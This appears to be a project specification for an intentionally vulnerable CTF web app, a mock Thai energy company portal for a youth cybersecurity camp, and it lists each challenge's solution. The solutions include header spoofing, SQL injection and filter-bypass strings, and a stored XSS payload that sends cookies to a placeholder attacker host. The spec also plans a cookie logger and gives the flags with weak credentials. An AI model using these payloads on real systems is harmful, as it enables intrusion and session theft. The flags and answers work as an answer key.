# HACKDAY LAB - PTPetho CTF Challenge

## Project Overview

A realistic vulnerable web application for cybersecurity education. Students will exploit real vulnerabilities (SQLi, XSS, Session Hijacking) in a controlled environment that mimics a Thai energy company's internal portal.

**Target Audience:** Students aged 11-18 at Summer Camp
**Duration:** 2-2.5 hours CTF challenge
**Total Challenges:** 10
**Total Flags:** 5

---

## Story Context

> **March 2569 (2026):** Diesel prices surge 6 THB/liter overnight. Rumors of 13 THB refinery margins spread on social media. #BanPTPetho trends nationwide. The public demands: What are the real costs?

Students play as a pentest team helping journalist "Chonticha Wongsuwan" uncover hidden fuel cost data from PTPetho's internal systems.

---

## Tech Stack

| Component | Technology | Version |
|-----------|------------|---------|
| Frontend | HTML5, CSS3, JavaScript | - |
| Charts | Chart.js | 4.x |
| Backend | PHP | 8.1+ |
| Database | MySQL | 8.0+ |
| Container | Docker + Docker Compose | Latest |
| Web Server | Apache (httpd) | 2.4 |

---

## Deployment

- **Server:** HPE ProLiant Gen 9
- **OS:** Ubuntu (VM)
- **Method:** Docker containers
- **Repository:** GitHub → git clone → docker-compose up

---

## UI/UX Requirements

### Color Scheme (Thai Energy Company Aesthetic)
```css
:root {
  --primary-green: #0d6e3f;      /* Dark Green - Trust, Energy */
  --primary-gold: #d4a720;        /* Gold - Premium, Thai Royal */
  --accent-light-green: #28a745;  /* Light Green - Actions */
  --background-white: #ffffff;    /* Clean background */
  --background-light: #f8f9fa;    /* Light gray sections */
  --text-dark: #1a1a1a;           /* Main text */
  --text-muted: #6c757d;          /* Secondary text */
  --danger-red: #dc3545;          /* Errors, warnings */
  --border-color: #dee2e6;        /* Subtle borders */
}
```

### Design Guidelines
- Modern corporate design (similar to PTT, Bangchak, Shell)
- Professional Thai language (ภาษาทางการ)
- Responsive layout (desktop-first, but mobile-friendly)
- Admin dashboard must look "privileged" with:
  - Sidebar navigation
  - Stats cards with icons
  - Charts (Chart.js bar/line charts)
  - Data tables with sorting
  - User avatar and role display

### Typography
- Headings: Prompt (Google Fonts) or Sarabun
- Body: Sarabun or system sans-serif
- Monospace: Fira Code (for code/data)

---

## Folder Structure

```
HACKDAY-LAB/
├── CLAUDE.md                    # This file - Project specification
├── README.md                    # Setup instructions
├── docker-compose.yml           # Docker orchestration
├── Dockerfile                   # PHP+Apache image
├── .gitignore                   # Git ignore rules
├── .env.example                 # Environment variables template
│
├── src/                         # Application source code
│   ├── index.php               # Public homepage
│   ├── upgrade.php             # Upgrade page (Challenge 2)
│   ├── verify.php              # QA verify page (Challenge 3)
│   │
│   ├── api/
│   │   └── internal/
│   │       └── config.json     # Exposed config (Challenge 3)
│   │
│   ├── ptpetho-admin/          # Admin portal
│   │   ├── index.php           # Login page (Challenge 4, 7)
│   │   ├── dashboard.php       # Admin dashboard
│   │   ├── search.php          # Staff search (Challenge 5-6)
│   │   ├── feedback.php        # Feedback system (Challenge 8-9)
│   │   ├── feedback-view.php   # View feedback (XSS trigger)
│   │   └── fuel-cost.php       # CEO-only page (Challenge 10)
│   │
│   ├── assets/
│   │   ├── css/
│   │   │   ├── style.css       # Main stylesheet
│   │   │   └── admin.css       # Admin-specific styles
│   │   ├── js/
│   │   │   ├── main.js         # Public site JS
│   │   │   └── admin.js        # Admin dashboard JS
│   │   └── img/
│   │       ├── logo.png        # PTPetho logo
│   │       ├── hero-bg.jpg     # Homepage hero
│   │       └── favicon.ico     # Favicon
│   │
│   ├── includes/
│   │   ├── config.php          # Database connection
│   │   ├── functions.php       # Helper functions
│   │   ├── header.php          # Public header
│   │   ├── footer.php          # Public footer
│   │   ├── admin-header.php    # Admin header
│   │   └── admin-sidebar.php   # Admin sidebar
│   │
│   └── logger/
│       └── index.php           # Cookie catcher for demo
│
├── database/
│   ├── init.sql                # Database schema + seed data
│   └── seed-extra.sql          # Additional test data
│
└── docs/
    ├── CHALLENGES.md           # Challenge walkthrough (instructor)
    ├── FLAGS.md                # All flags reference
    └── SETUP.md                # Detailed setup guide
```

---

## Challenge Implementation

### Phase 1: Web Essentials (Recon)

#### Challenge 1: "ใครทิ้งอะไรไว้?" (View Source)
**File:** `src/index.php`
**Vulnerability:** HTML comments with sensitive info
```html
<!-- stack: PHP 8.1 + MySQL 8.0 + Apache -->
<!-- TODO: disable /secret-panel before go-live -->
<!-- contact dev-ops@ptpetho.local for issues -->
<input type="hidden" name="client_tier" value="free">
```

#### Challenge 2: "ของฟรีมี secret" (Client Manipulation)
**File:** `src/upgrade.php`
**Vulnerability:** Hidden form fields can be modified
```html
<input type="hidden" name="client_tier" value="free">
<input type="hidden" name="price" value="2999">
```

#### Challenge 3: "Network Tab" (Exposed API)
**File:** `src/verify.php` → loads `src/api/internal/config.json`
**Vulnerability:** Sensitive config exposed
```json
{
  "admin_portal": "/ptpetho-admin",
  "trusted_header": "X-Forwarded-For",
  "trusted_referrer": "ptpetho-sso.local"
}
```

#### Challenge 4: "Header Spoofing" → FLAG 1
**File:** `src/ptpetho-admin/index.php`
**Vulnerability:** Trusts X-Forwarded-For and Referer headers
**Solution:** Add headers via Burp Suite
```
X-Forwarded-For: 192.168.1.1
Referer: http://ptpetho-sso.local
```
**FLAG 1:** `FLAG{h34d3r_trust_1ssu3}`

---

### Phase 2: SQL Injection

#### Challenge 5: "Search Bar Discovery"
**File:** `src/ptpetho-admin/search.php`
**Vulnerability:** Error-based SQLi
```sql
SELECT * FROM staff WHERE name='$input'
-- Input: test' → SQL error reveals structure
```

#### Challenge 6: "Union-Based SQLi" → FLAG 2
**File:** `src/ptpetho-admin/search.php`
**Vulnerability:** Union injection
```sql
' UNION SELECT username,password_hash,role,4 FROM ptpetho_staff WHERE role='superadmin'-- -
```
**Result:** director.kim / 3fc0a7acf087f549ac2b266baf94b8b1 (MD5: ptpetho2026)
**FLAG 2:** `FLAG{uni0n_b4s3d_extr4ct10n}`

#### Challenge 7: "Filter Bypass" → FLAG 3
**File:** `src/ptpetho-admin/index.php`
**Vulnerability:** Incomplete filter (blocks --, #, UNION, SELECT)
**Solution:** Use /* comment
```sql
admin' OR 1=1/*
```
**FLAG 3:** `FLAG{f1lt3r_byp4ss_succ3ss}`

---

### Phase 3: XSS + Session Hijacking

#### Challenge 8: "Stored XSS Discovery"
**File:** `src/ptpetho-admin/feedback.php`
**Vulnerability:** No input sanitization
```html
<script>alert(1)</script>
```

#### Challenge 9: "Cookie Stealing" → FLAG 4
**File:** `src/ptpetho-admin/feedback.php`
**Vulnerability:** Stored XSS → Cookie theft
```html
<img src=x onerror="fetch('http://ATTACKER:8000/log?c='+document.cookie)">
```
**FLAG 4:** `FLAG{st0r3d_xss_c00k13_th3ft}`

#### Challenge 10: "Session Hijacking" → FLAG 5
**File:** `src/ptpetho-admin/fuel-cost.php`
**Vulnerability:** Session can be hijacked with stolen cookie
**Solution:** Add CEO's session cookie in browser DevTools
**FLAG 5:** `FLAG{s3ss10n_h1j4ck_truth_r3v34l3d}`

---

## Database Schema

### Tables Required

1. **users** - Login credentials
2. **ptpetho_staff** - Employee data (for SQLi search)
3. **admin_feedback** - Feedback messages (for XSS)
4. **fuel_cost_analysis** - Secret data (final reveal)
5. **audit_log** - Activity logging (realism)
6. **client_tiers** - User tiers (Challenge 2)

### Key Accounts

| Username | Password (Plain) | Password (MD5) | Role |
|----------|------------------|----------------|------|
| admin | admin | 21232f297a57a5a743894a0e4a801fc3 | admin |
| director.kim | ptpetho2026 | 3fc0a7acf087f549ac2b266baf94b8b1 | superadmin |
| ceo.somchai | password | 5f4dcc3b5aa765d61d8327deb882cf99 | ceo |

---

## Docker Configuration

### docker-compose.yml
```yaml
version: '3.8'
services:
  web:
    build: .
    ports:
      - "80:80"
    volumes:
      - ./src:/var/www/html
    depends_on:
      - db
    environment:
      - DB_HOST=db
      - DB_NAME=ptpetho_internal
      - DB_USER=ptpetho
      - DB_PASS=ptpetho_secret

  db:
    image: mysql:8.0
    environment:
      - MYSQL_ROOT_PASSWORD=root_secret
      - MYSQL_DATABASE=ptpetho_internal
      - MYSQL_USER=ptpetho
      - MYSQL_PASSWORD=ptpetho_secret
    volumes:
      - ./database/init.sql:/docker-entrypoint-initdb.d/init.sql
      - db_data:/var/lib/mysql

  logger:
    build: .
    ports:
      - "8000:80"
    volumes:
      - ./src/logger:/var/www/html

volumes:
  db_data:
```

---

## Flags Reference

| # | Flag Value | Challenge | Points |
|---|------------|-----------|--------|
| 1 | `FLAG{h34d3r_trust_1ssu3}` | Header Spoofing | 100 |
| 2 | `FLAG{uni0n_b4s3d_extr4ct10n}` | Union SQLi | 200 |
| 3 | `FLAG{f1lt3r_byp4ss_succ3ss}` | Filter Bypass | 150 |
| 4 | `FLAG{st0r3d_xss_c00k13_th3ft}` | Stored XSS | 200 |
| 5 | `FLAG{s3ss10n_h1j4ck_truth_r3v34l3d}` | Session Hijack | 250 |

---

## TODO - Implementation Checklist

### Setup & Config
- [ ] Create docker-compose.yml
- [ ] Create Dockerfile (PHP 8.1 + Apache)
- [ ] Create .gitignore
- [ ] Create .env.example
- [ ] Create README.md with setup instructions

### Database
- [ ] Create init.sql with all tables
- [ ] Insert seed data (users, staff, fuel costs)
- [ ] Test database connection

### Public Pages
- [ ] index.php - Homepage with hidden comments
- [ ] upgrade.php - Tier upgrade form
- [ ] verify.php - QA verification page
- [ ] api/internal/config.json - Exposed config

### Admin Portal
- [ ] ptpetho-admin/index.php - Login with vulnerabilities
- [ ] ptpetho-admin/dashboard.php - Admin dashboard with charts
- [ ] ptpetho-admin/search.php - Staff search (SQLi)
- [ ] ptpetho-admin/feedback.php - Feedback form (XSS)
- [ ] ptpetho-admin/feedback-view.php - View feedback
- [ ] ptpetho-admin/fuel-cost.php - CEO-only page

### Assets
- [ ] assets/css/style.css - Main styles
- [ ] assets/css/admin.css - Admin styles
- [ ] assets/js/main.js - Public JS
- [ ] assets/js/admin.js - Admin JS (Chart.js)
- [ ] assets/img/logo.png - PTPetho logo

### Includes
- [ ] includes/config.php - DB connection
- [ ] includes/functions.php - Helper functions
- [ ] includes/header.php - Public header
- [ ] includes/footer.php - Public footer
- [ ] includes/admin-header.php - Admin header
- [ ] includes/admin-sidebar.php - Admin sidebar

### Cookie Logger
- [ ] logger/index.php - Simple request logger

### Documentation
- [ ] docs/CHALLENGES.md - Instructor walkthrough
- [ ] docs/FLAGS.md - Flag reference
- [ ] docs/SETUP.md - Detailed setup

### Testing
- [ ] Test all 10 challenges work correctly
- [ ] Test Docker deployment
- [ ] Test on Ubuntu VM

---

## Development Commands

```bash
# Start development environment
docker-compose up -d

# View logs
docker-compose logs -f web

# Rebuild after changes
docker-compose up -d --build

# Stop everything
docker-compose down

# Reset database
docker-compose down -v
docker-compose up -d

# Access MySQL CLI
docker-compose exec db mysql -u ptpetho -p ptpetho_internal
```

---

## Security Notes (For Instructor)

This application is **INTENTIONALLY VULNERABLE**. It is designed for educational purposes only.

**DO NOT:**
- Deploy on public internet without access control
- Use in production environments
- Store real sensitive data

**RECOMMENDED:**
- Run on isolated network
- Use VM that can be reset
- Monitor student activity
- Remind students about ethics/legality

---

## Credits

Created for Summer Camp 5 - Cybersecurity Education
Challenges designed to teach: Web Security, SQLi, XSS, Session Management

---

*Last Updated: 2026-04-17*
*Version: 1.0.0*
